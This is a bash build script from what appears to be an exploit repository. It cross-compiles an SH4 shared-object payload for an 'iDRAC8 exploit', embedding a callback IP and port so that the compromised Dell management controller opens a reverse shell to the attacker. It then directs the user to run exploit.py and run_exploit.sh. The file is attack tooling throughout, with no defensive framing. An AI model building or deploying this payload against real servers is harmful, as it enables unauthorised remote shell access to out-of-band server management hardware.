#!/usr/bin/env bash
# build_payload.sh — compile the SH4 payload for the iDRAC8 exploit
#
# DEPENDENCIES (Ubuntu/Debian):
#   sudo apt-get install gcc-sh4-linux-gnu binutils-sh4-linux-gnu
#
# On the poweredge server these are already installed.
#
# USAGE:
#   ./scripts/build_payload.sh [callback_ip] [callback_port]
#
#   callback_ip   IP the iDRAC will connect back to (defaults to 192.168.1.101)
#   callback_port TCP port for the reverse shell listener (defaults to 4444)
#
# OUTPUT:
#   payload.so  — copy this to the directory where exploit.py looks for it
#
# Example (run from repo root):
#   ./scripts/build_payload.sh 192.168.1.101 4444

set -euo pipefail

CALLBACK_IP="${1:-192.168.1.101}"
CALLBACK_PORT="${2:-4444}"
SRC="src/payload.c"
OUT="payload.so"

CC="sh4-linux-gnu-gcc"

if ! command -v "$CC" &>/dev/null; then
    echo "ERROR: $CC not found."
    echo "Install with: sudo apt-get install gcc-sh4-linux-gnu binutils-sh4-linux-gnu"
    exit 1
fi

echo "Building SH4 payload..."
echo "  Callback: ${CALLBACK_IP}:${CALLBACK_PORT}"
echo "  Source:   ${SRC}"
echo "  Output:   ${OUT}"

"$CC" \
    -shared \
    -fPIC \
    -nostartfiles \
    -DCALLBACK_IP="\"${CALLBACK_IP}\"" \
    -DCALLBACK_PORT="${CALLBACK_PORT}" \
    -o "${OUT}" \
    "${SRC}"

echo ""
echo "Built: $(ls -lh ${OUT})"
echo ""
echo "Next: run scripts/run_exploit.sh"
